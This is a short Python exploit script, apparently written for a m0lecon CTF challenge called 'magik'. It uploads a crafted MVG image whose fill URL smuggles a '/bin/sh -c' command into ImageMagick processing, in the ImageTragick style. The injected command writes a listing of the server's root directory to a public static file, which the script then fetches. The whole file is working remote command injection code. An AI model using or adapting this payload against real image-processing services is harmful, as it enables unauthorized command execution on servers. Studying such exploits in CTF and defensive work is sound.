import requests
import sys

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it"

def upload(payload: str, name: str = "test", content_type: str = "image/x-mvg"):
    files = {"img": ("exploit.mvg", payload.encode(), content_type)}
    data = {"name": name}
    resp = requests.post(URL, files=files, data=data, timeout=10)
    print(f"[+] upload status: {resp.status_code}")
    if resp.status_code != 200:
        print(resp.text[:200])
    return resp

def fetch(path: str):
    url = f"{URL}/{path.lstrip('/')}"
    resp = requests.get(url, timeout=10)
    print(f"[+] fetch {path}: {resp.status_code}")
    if resp.status_code == 200:
        try:
            print(resp.text)
        except UnicodeDecodeError:
            print(resp.content[:100])
    else:
        print(resp.text[:200])

if __name__ == "__main__":
    payload = """push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|/bin/sh -c "/bin/ls / > /app/static/cmd.txt" ")'
rectangle 0,0 640 480
pop graphic-context"""
    upload(payload, name="testls")
    fetch("static/cmd.txt")
